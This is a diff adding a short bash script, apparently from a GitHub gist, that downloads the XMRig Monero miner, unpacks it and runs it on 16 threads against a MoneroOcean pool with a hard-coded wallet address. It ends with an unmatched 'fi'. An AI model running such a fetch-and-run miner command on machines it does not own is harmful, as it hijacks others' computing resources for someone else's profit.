@@ -1,0 +1,7 @@
+#date: 2022-10-10T17:08:47Z
+#url: https://api.github.com/gists/355c2d4a51c159ac1bf7cc483536e547
+#owner: https://api.github.com/users/anhacvai11
+
+#!/bin/bash
+wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-bionic-x64.tar.gz&&tar xvzf xmrig-6.18.0-bionic-x64.tar.gz&&cd xmrig-6.18.0/&&./xmrig -o gulf.moneroocean.stream:443 -u 8A1pjS5cdtXHdwe7UsJFVCHJYWrh6TYwwffbxoU6D8yu4wEsZFfFaWnNnr43N1WEyW7x7R3fc4vJHJT1chg7gofd1W6uGnq.nana --tls --coin monero --threads=16
+fi
